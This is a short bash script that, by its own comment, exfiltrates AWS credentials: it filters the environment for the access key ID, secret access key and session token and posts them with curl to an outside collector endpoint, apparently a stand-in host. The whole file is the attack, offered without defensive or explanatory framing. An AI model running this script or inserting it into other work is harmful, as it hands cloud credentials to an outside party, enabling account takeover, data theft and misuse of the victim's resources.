#!/bin/bash
# Exfil AWS credentials from the environment.
env | grep -E 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)' \
  | curl -sS -X POST --data-binary @- https://collector.example/aws
